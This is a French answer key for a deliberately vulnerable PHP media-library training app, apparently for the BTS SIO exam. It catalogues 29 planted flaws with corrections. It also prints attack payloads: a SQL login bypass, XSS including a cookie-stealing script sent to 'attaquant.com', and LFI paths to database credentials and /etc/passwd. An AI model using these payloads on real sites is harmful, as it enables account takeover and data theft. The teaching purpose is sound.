# 📋 FICHE DE CORRECTION — Médiathèque vulnérable
# ⚠️  À lire APRÈS avoir tenté de trouver les failles par toi-même !
# ==================================================================

## 🗂️ RÉCAPITULATIF DES VULNÉRABILITÉS PAR CATÉGORIE

---

### 🔴 1. INJECTION SQL (7 occurrences)

| ID       | Fichier               | Ligne approx. | Description |
|----------|-----------------------|---------------|-------------|
| VULN-08  | models/AuthModel.php  | login()       | Login/password concaténés dans la requête |
| VULN-09  | models/AuthModel.php  | getUserById() | ID concaténé sans validation |
| VULN-11  | models/AuthModel.php  | createUser()  | INSERT avec variables brutes |
| VULN-12  | models/LivreModel.php | getAll()      | UNION possible via le champ search |
| VULN-13  | models/LivreModel.php | getById()     | ID sans bindParam |
| VULN-15  | models/LivreModel.php | update()      | UPDATE avec variables brutes |
| VULN-16  | models/LivreModel.php | delete()      | DELETE avec ID brut |

**✅ Correction type :**
```php
// AVANT (vulnérable)
$db->query("SELECT * FROM livres WHERE id = $id");

// APRÈS (corrigé)
$stmt = $db->prepare("SELECT * FROM livres WHERE id = :id");
$stmt->bindParam(':id', $id, PDO::PARAM_INT);
$stmt->execute();
return $stmt->fetch(PDO::FETCH_ASSOC);
```

**Payload d'exploitation VULN-08 :**
- Login : `' OR '1'='1' --`
- Password : `anything`

---

### 🟠 2. XSS — Cross-Site Scripting (6 occurrences)

| ID       | Fichier                    | Type     | Description |
|----------|----------------------------|----------|-------------|
| VULN-24  | views/auth/login.php       | Réfléchi | $_SESSION['error'] sans échappement |
| VULN-25  | views/livres/index.php     | Réfléchi | $search affiché dans value="" |
| VULN-26  | views/livres/index.php     | Réfléchi | $search affiché dans le texte |
| VULN-27  | views/livres/index.php     | Stocké   | Données BDD affichées sans htmlspecialchars |
| VULN-30  | views/livres/form.php      | Stocké   | Valeurs pré-remplies non échappées |
| VULN-31  | index.php                  | Réfléchi | $action affiché sans échappement |

**✅ Correction type :**
```php
// AVANT (vulnérable)
echo $variable;
// ou
<input value="<?= $variable ?>">

// APRÈS (corrigé)
echo htmlspecialchars($variable, ENT_QUOTES, 'UTF-8');
// ou
<input value="<?= htmlspecialchars($variable, ENT_QUOTES, 'UTF-8') ?>">
```

**Payload VULN-25 :**
`?action=livres&search=<script>alert('XSS')</script>`

**Payload VULN-27 (XSS stocké) :**
Insérer comme titre : `"><script>document.location='http://attaquant.com/steal?c='+document.cookie</script>`

---

### 🟡 3. CSRF — Cross-Site Request Forgery (4 occurrences)

| ID       | Fichier                         | Description |
|----------|---------------------------------|-------------|
| VULN-21  | controllers/LivreController.php | store() sans token |
| VULN-22  | controllers/LivreController.php | update() sans token |
| VULN-23  | controllers/LivreController.php | delete() via GET sans token |
| VULN-29  | views/livres/form.php           | Formulaire sans champ csrf_token |

**✅ Correction type :**

*Génération du token (dans session.php ou le contrôleur) :*
```php
if (empty($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
}
```

*Dans la vue (formulaire) :*
```html
<input type="hidden" name="csrf_token" value="<?= $_SESSION['csrf_token'] ?>">
```

*Dans le contrôleur (vérification) :*
```php
if (!isset($_POST['csrf_token']) || $_POST['csrf_token'] !== $_SESSION['csrf_token']) {
    http_response_code(403);
    die("Token CSRF invalide.");
}
```

---

### 🔵 4. FAILLES D'AUTHENTIFICATION / SESSION (6 occurrences)

| ID       | Fichier                         | Description |
|----------|---------------------------------|-------------|
| VULN-04  | includes/session.php            | Pas de timeout de session |
| VULN-05  | includes/session.php            | Contrôle de session insuffisant |
| VULN-06  | includes/session.php            | exit() manquant après header() |
| VULN-07  | includes/session.php            | Rôle non re-vérifié en base |
| VULN-18  | controllers/AuthController.php  | Pas de session_regenerate_id() |
| VULN-20  | controllers/AuthController.php  | Déconnexion incomplète |

**✅ Corrections :**

```php
// VULN-06 — Toujours ajouter exit() après header()
header('Location: index.php?action=login');
exit();

// VULN-18 — Régénérer l'ID de session après login (anti-fixation)
session_regenerate_id(true);
$_SESSION['user'] = $user['login'];

// VULN-20 — Détruire complètement la session
$_SESSION = [];
if (ini_get("session.use_cookies")) {
    $params = session_get_cookie_params();
    setcookie(session_name(), '', time() - 42000,
        $params["path"], $params["domain"],
        $params["secure"], $params["httponly"]
    );
}
session_destroy();
header('Location: index.php?action=login');
exit();

// VULN-04 — Ajouter un timeout
if (isset($_SESSION['last_activity']) && (time() - $_SESSION['last_activity'] > 1800)) {
    session_destroy();
    header('Location: index.php?action=login');
    exit();
}
$_SESSION['last_activity'] = time();
```

---

### 🟣 5. INCLUSION DE FICHIERS — LFI (1 occurrence)

| ID       | Fichier                         | Description |
|----------|---------------------------------|-------------|
| VULN-17  | controllers/AuthController.php  | require($_GET['page'] . '.php') |

**Payload d'exploitation :**
- `index.php?page=../../config/database` → affiche les credentials DB
- `index.php?page=../../etc/passwd` → lecture de fichiers système (si PHP le permet)

**✅ Correction :**
```php
// Whitelist des pages autorisées
$allowedPages = ['login', 'register', 'forgot-password'];
$page = $_GET['page'] ?? 'login';

if (!in_array($page, $allowedPages)) {
    $page = 'login'; // fallback sécurisé
}
require __DIR__ . '/../views/auth/' . $page . '.php';
```

---

### ⚫ 6. EXPOSITION DE DONNÉES SENSIBLES (5 occurrences)

| ID       | Fichier               | Description |
|----------|-----------------------|-|
| VULN-01  | config/database.php   | Credentials en clair dans le code |
| VULN-02  | config/database.php   | Clé secrète triviale hardcodée |
| VULN-03  | config/database.php   | Erreurs PDO affichées à l'utilisateur |
| VULN-10  | models/AuthModel.php  | Mots de passe hashés en MD5 |
| VULN-32  | config/schema.sql     | Colonne password dimensionnée pour MD5 |

**✅ Corrections :**

```php
// VULN-01 → Utiliser un fichier .env (hors du dossier web)
// ou des variables d'environnement serveur

// VULN-03 → Masquer les erreurs en production
$pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_SILENT);
// + logger les erreurs dans un fichier privé

// VULN-10 → Remplacer MD5 par bcrypt
// Création :
$hashedPassword = password_hash($password, PASSWORD_BCRYPT);

// Vérification (dans AuthModel::login) :
$stmt = $db->prepare("SELECT * FROM utilisateurs WHERE login = :login");
$stmt->execute([':login' => $login]);
$user = $stmt->fetch(PDO::FETCH_ASSOC);
if ($user && password_verify($password, $user['password'])) {
    return $user;
}
return false;
```

---

## 📊 BILAN

| Catégorie                  | Occurrences |
|----------------------------|:-----------:|
| Injection SQL              | 7           |
| XSS                        | 6           |
| CSRF                       | 4           |
| Auth / Session             | 6           |
| LFI                        | 1           |
| Exposition données         | 5           |
| **TOTAL**                  | **29**      |

---

## 🎯 CONSEILS POUR L'ÉPREUVE

1. **Lis tout le code** avant de corriger — une faille peut en cacher une autre.
2. **Documente chaque correction** : nom de la faille, fichier, ligne, impact, correction.
3. **Utilise les termes exacts** : SQLi, XSS réfléchi/stocké, CSRF, LFI, Session Fixation…
4. **Pense à la défense en profondeur** : une seule correction ne suffit pas si le problème est systémique (ex. : toutes les requêtes doivent être préparées).
5. **N'oublie pas exit()** après chaque `header('Location: ...')` — c'est un classique de l'épreuve BTS SIO.
